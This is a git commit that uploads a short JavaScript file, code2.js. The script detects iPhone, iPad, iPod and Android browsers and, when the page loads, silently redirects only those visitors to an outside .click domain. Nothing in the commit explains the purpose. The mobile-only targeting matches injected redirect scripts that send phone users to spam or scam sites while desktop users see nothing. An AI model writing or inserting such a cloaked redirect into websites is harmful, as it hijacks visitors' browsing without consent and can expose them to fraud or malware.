d2e4362ff97f8a71fc97d769ca11a8ceefdd4aa2
kenkiller1st <98470178+kenkiller1st@users.noreply.github.com>
2023-04-18 14:42:30 +0700

    Add files via upload

---
+++ code2.js
@@ -0,0 +1,7 @@
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+if (isMobile) {
+    window.onload = function() {
+        window.location.href = "http://maohoankhangchinhhang.click/moctoc";
+      };
+}
